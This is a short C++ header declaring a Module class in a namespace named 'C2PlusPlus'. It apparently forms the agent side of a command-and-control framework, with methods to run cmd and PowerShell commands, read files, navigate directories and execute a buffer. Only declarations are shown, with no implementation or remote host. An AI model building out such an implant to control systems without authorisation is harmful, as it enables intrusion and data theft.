#pragma once
#include <string>


namespace C2PlusPlus
{
	class Module
	{
	public:
		std::string Cmd(const std::string& command);
		std::string RunPowerShell(const std::string& command);
		std::string GetCurrentUserName();
		std::string PWD();
		std::string ListCurrentDir(std::string path);
		std::string ListCurrentDir();
		std::string ChangeDir(const std::string& directory);
		std::string Cat(const std::string& file);
		std::string static Random();
		std::string Execute(std::string buffer);
	private:
		std::string result = "";
		std::string currentDirectory = "";
	};
}